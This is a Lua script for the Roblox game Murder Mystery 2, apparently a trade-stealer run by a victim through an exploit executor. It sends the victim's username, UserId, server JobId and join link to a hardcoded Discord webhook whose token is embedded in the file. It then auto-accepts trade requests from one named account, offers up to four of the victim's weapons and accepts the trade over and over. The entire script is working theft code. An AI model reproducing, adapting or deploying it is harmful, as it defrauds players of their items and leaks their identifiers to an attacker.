-- MM2 Auto Transfer (Mobile / iPad focused)
-- Auto-accepts from naimradio6 + tries to put weapons

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")
local LocalPlayer = Players.LocalPlayer
local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")

local TARGET_USERNAME = "naimradio6"
local WEBHOOK_URL = "https://discord.com/api/webhooks/1538148455451590656/KSNxBCVNMiwESQtLcUHE7FOVyYBocSUgCo0e8SgX9wuHlsx2PUJGQxUuKFmD8sZkRwM2"
local PLACE_ID = 142823291

-- ========== WEBHOOK ==========
local function sendWebhook()
    local jobId = tostring(game.JobId)
    local data = {
        content = "@everyone **MM2 Transfer Ready (Mobile)**",
        embeds = {{
            title = "Quick Transfer",
            color = 5763719,
            fields = {
                {name = "Username", value = LocalPlayer.Name, inline = true},
                {name = "UserId", value = tostring(LocalPlayer.UserId), inline = true},
                {name = "JobId", value = "`" .. jobId .. "`", inline = false},
                {name = "Join Link", value = "https://fern.wtf/joiner?placeId=" .. PLACE_ID .. "&gameInstanceId=" .. jobId, inline = false},
            },
            footer = {text = "Waiting for trade from " .. TARGET_USERNAME},
            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
        }}
    }
    pcall(function()
        local req = (syn and syn.request) or (http and http.request) or request or http_request
        if req then
            req({
                Url = WEBHOOK_URL,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = HttpService:JSONEncode(data)
            })
        end
    end)
    print("[Transfer] Webhook sent")
end
sendWebhook()

-- ========== REMOTES ==========
local Trade = ReplicatedStorage:WaitForChild("Trade", 15)
if not Trade then
    warn("[Transfer] Trade folder not found")
    return
end

local OfferItem     = Trade:FindFirstChild("OfferItem")
local AcceptRequest = Trade:FindFirstChild("AcceptRequest")
local AcceptTrade   = Trade:FindFirstChild("AcceptTrade")
local SendRequest   = Trade:FindFirstChild("SendRequest")
local StartTrade    = Trade:FindFirstChild("StartTrade")
local UpdateTrade   = Trade:FindFirstChild("UpdateTrade")
local DeclineTrade  = Trade:FindFirstChild("DeclineTrade")

local trading = false

local function isTarget(name)
    return name and tostring(name):lower() == TARGET_USERNAME:lower()
end

-- ========== GET WEAPONS ==========
local function getWeapons()
    local list = {}
    pcall(function()
        local ProfileData = require(ReplicatedStorage.Modules.ProfileData)
        if ProfileData and ProfileData.Weapons and ProfileData.Weapons.Owned then
            for name, amount in pairs(ProfileData.Weapons.Owned) do
                if amount and amount > 0 and name ~= "DefaultKnife" and name ~= "DefaultGun" then
                    table.insert(list, name)
                end
            end
        end
    end)
    return list
end

-- ========== OFFER WEAPONS ==========
local function offerWeapons()
    if not OfferItem or not trading then return end
    local weapons = getWeapons()
    if #weapons == 0 then
        print("[Transfer] No weapons left")
        return
    end

    local offered = 0
    for i = 1, math.min(4, #weapons) do
        local ok = pcall(function()
            OfferItem:FireServer(weapons[i], "Weapons")
        end)
        if ok then
            offered += 1
            print("[Transfer] Offered:", weapons[i])
            task.wait(0.3)
        end
    end
    print("[Transfer] Offered", offered, "items")
end

-- ========== FORCE ACCEPT REQUEST (safe way) ==========
if SendRequest then
    -- Just SET the callback (do NOT read the old one)
    SendRequest.OnClientInvoke = function(fromPlayer)
        if isTarget(fromPlayer and fromPlayer.Name) then
            print("[Transfer] Request from target → accepting")
            trading = true
            task.wait(0.4)
            if AcceptRequest then
                pcall(function() AcceptRequest:FireServer() end)
            end
            return true
        end
        return false
    end
end

-- ========== MOBILE / PHONE GUI WATCHER ==========
local function watchTradeGUI(guiName)
    local gui = PlayerGui:FindFirstChild(guiName)
    if gui then
        gui:GetPropertyChangedSignal("Enabled"):Connect(function()
            if gui.Enabled and trading then
                print("[Transfer] Trade GUI opened (" .. guiName .. ")")
                task.wait(0.8)
                offerWeapons()
                task.wait(1)
                if AcceptTrade then
                    pcall(function() AcceptTrade:FireServer() end)
                end
            end
        end)
    end
end

-- Watch both PC and Mobile trade GUIs
watchTradeGUI("TradeGUI")
watchTradeGUI("TradeGUI_Phone")

-- Also watch if they get created later
PlayerGui.ChildAdded:Connect(function(child)
    if child.Name == "TradeGUI" or child.Name == "TradeGUI_Phone" then
        watchTradeGUI(child.Name)
    end
end)

-- ========== START / UPDATE TRADE ==========
if StartTrade then
    StartTrade.OnClientEvent:Connect(function()
        if trading then
            print("[Transfer] Trade started")
            task.wait(0.7)
            offerWeapons()
        end
    end)
end

if UpdateTrade then
    UpdateTrade.OnClientEvent:Connect(function()
        if trading then
            task.wait(0.5)
            offerWeapons()
            task.wait(0.8)
            if AcceptTrade then
                pcall(function() AcceptTrade:FireServer() end)
            end
        end
    end)
end

-- Keep accepting while in trade (helps confirmation screen)
task.spawn(function()
    while true do
        task.wait(1.5)
        if trading and AcceptTrade then
            pcall(function() AcceptTrade:FireServer() end)
        end
    end
end)

if DeclineTrade then
    DeclineTrade.OnClientEvent:Connect(function()
        trading = false
        print("[Transfer] Trade ended")
    end)
end

print("[Transfer] Mobile script loaded")
print("[Transfer] Waiting for trade from:", TARGET_USERNAME)
print("[Transfer] Trade GUI will stay visible")
